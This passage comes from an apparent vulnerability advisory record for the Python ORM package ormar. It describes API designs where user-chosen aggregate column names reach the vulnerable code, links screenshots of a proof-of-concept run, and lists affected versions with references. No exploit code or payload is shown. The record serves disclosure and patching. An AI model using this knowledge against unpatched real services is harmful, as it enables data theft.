include:**\n\n- **REST APIs** with user-selectable aggregate fields: `GET /items/stats?column=\u003cinput\u003e`\n- **GraphQL resolvers** that accept field names as arguments\n- **Dynamic report generators** where users select columns for aggregation\n\nThe vulnerable server in this PoC is based on the **official ormar FastAPI example**, demonstrating that the vulnerability is easily triggered through natural, documented API design patterns. The ormar documentation itself shows this exact usage pattern: `await Book.objects.max(columns=[\"year\"])` ([[ormar aggregations docs](https://collerek.github.io/ormar/queries/aggregations/)](https://collerek.github.io/ormar/queries/aggregations/)).\n\n## Display of attack results\nTerminal 1 — Start server:\n![image](https://github.com/user-attachments/assets/4c8b4a20-75da-4aba-b649-f818e46165dd)\nTerminal 2 — Run attacker:\n\u003cimg width=\"2004\" height=\"1478\" alt=\"image (1)\" src=\"https://github.com/user-attachments/assets/ae41657b-2730-4fab-ac01-e79acd267bde\" /\u003e\n\u003cimg width=\"1984\" height=\"1500\" alt=\"image (2)\" src=\"https://github.com/user-attachments/assets/cbe0d652-d4d4-458c-998b-e636d6c362a1\" /\u003e",
  "affected": [
    {
      "package": {
        "ecosystem": "PyPI",
        "name": "ormar",
        "purl": "pkg:pypi/ormar"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0.9.9"
            },
            {
              "fixed": "0.23.0"
            }
          ]
        }
      ],
      "versions": [
        "0.10.0",
        "0.10.1",
        "0.10.10",
        "0.10.11",
        "0.10.12",
        "0.10.13",
        "0.10.14",
        "0.10.15",
        "0.10.16",
        "0.10.17",
        "0.10.18",
        "0.10.19",
        "0.10.2",
        "0.10.20",
        "0.10.21",
        "0.10.22",
        "0.10.23",
        "0.10.24",
        "0.10.25",
        "0.10.3",
        "0.10.4",
        "0.10.5",
        "0.10.6",
        "0.10.7",
        "0.10.8",
        "0.10.9",
        "0.11.0",
        "0.11.1",
        "0.11.2",
        "0.11.3",
        "0.12.0",
        "0.12.1",
        "0.12.2",
        "0.12.3",
        "0.20.0",
        "0.20.1",
        "0.20.2",
        "0.21.0",
        "0.22.0",
        "0.9.9"
      ],
      "database_specific": {
        "last_known_affected_version_range": "\u003c= 0.22.0",
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-xxh2-68g9-8jqr/GHSA-xxh2-68g9-8jqr.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/collerek/ormar/security/advisories/GHSA-xxh2-68g9-8jqr"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26198"
    },
    {
      "type": "WEB",
      "url": "https://github.com/collerek/ormar/commit/a03bae14fe01358d3eaf7e319fcd5db2e4956b16"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/collerek/ormar"
    },
    {
      "type": "WEB",
      "url": "https://github.com/collerek/ormar/releases/tag/0.23.0"
    }
  ]
}